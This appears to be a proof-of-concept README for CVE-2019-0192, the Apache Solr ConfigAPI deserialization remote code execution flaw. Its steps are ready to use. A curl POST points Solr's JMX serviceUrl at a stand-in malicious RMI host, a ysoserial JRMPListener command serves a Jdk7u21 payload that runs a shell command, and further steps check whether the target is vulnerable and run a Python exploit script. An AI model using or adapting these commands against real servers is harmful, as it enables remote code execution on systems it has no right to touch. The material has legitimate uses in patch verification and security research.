# CVE-2019-0192 - Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5

_This is an early PoC of the Apache Solr RCE_

From https://issues.apache.org/jira/browse/SOLR-13301: 
> ConfigAPI allows to configure Solr's JMX server via an HTTP POST request.
By pointing it to a malicious RMI server, an attacker could take advantage
of Solr's unsafe deserialization to trigger remote code execution on the
Solr side.

### Proof Of Concept

![image](https://user-images.githubusercontent.com/5891788/54089326-28b32680-4368-11e9-8b9d-c066bb9ba120.png)

---

By looking on the description of the security advisory and checking on the **ConfigAPI** [ressources of Apache Solr](https://lucene.apache.org/solr/guide/6_6/config-api.html#ConfigAPI-CommandsforCommonProperties), we can find a reference to a JMX server:

![image](https://user-images.githubusercontent.com/5891788/54084547-5c735980-4332-11e9-825b-907e92876f6d.png)

> **serviceUrl** - (optional str) service URL for a JMX server. If not specified then the default platform MBean server will be used.

By checking how ConfigAPI is working we can reproduce how to set a remote JMX server:

```
curl -i -s -k  -X $'POST' \
    -H $'Host: 127.0.0.1:8983' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"set-property\":{\"jmx.serviceUrl\":\"service:jmx:rmi:///jndi/rmi://malicousrmierver.com:1099/obj\"}}' \
    $'http://127.0.0.1:8983/solr/techproducts/config/jmx'
```

For the PoC I will use **yoserial** to create a malicious RMI server using the payload **Jdk7u21**

1. Start the malicous RMI server:
```
java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 "touch /tmp/pwn.txt"
```
2. Run the POST request:
```
curl -i -s -k  -X $'POST' \
    -H $'Host: 127.0.0.1:8983' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"set-property\":{\"jmx.serviceUrl\":\"service:jmx:rmi:///jndi/rmi://malicousrmierver.com:1099/obj\"}}' \
    $'http://127.0.0.1:8983/solr/techproducts/config/jmx'
```
**note**: you should get a 500 error with a nice stacktrace

3. Check the stacktrace:

- If you saw this error: **"Non-annotation type in annotation serial stream"** it's mean that Apache Solr is running with a java version > [JRE 7u25](https://gist.github.com/frohoff/24af7913611f8406eaf3) and this poc will not work

- Otherwise you sould see this error: **"undeclared checked exception; nested exception is"** and the PoC should work.

### Exploit

1. Download [yoserial](https://github.com/frohoff/ysoserial) : https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
2. Change values into the script: 

```
remote = "http://172.18.0.5:8983"
ressource = ""
RHOST = "172.18.0.1"
RPORT = "1099"
```

3. Then execute the script:

```
python3 CVE-2019-0192.py
```


**Security Advisory**:
* http://mail-archives.us.apache.org/mod_mbox/www-announce/201903.mbox/%3CCAECwjAV1buZwg%2BMcV9EAQ19MeAWztPVJYD4zGK8kQdADFYij1w%40mail.gmail.com%3E

## Ressources:
* https://lucene.apache.org/solr/guide/6_6/config-api.html#ConfigAPI-CommandsforCommonProperties
* https://issues.apache.org/jira/browse/SOLR-13301
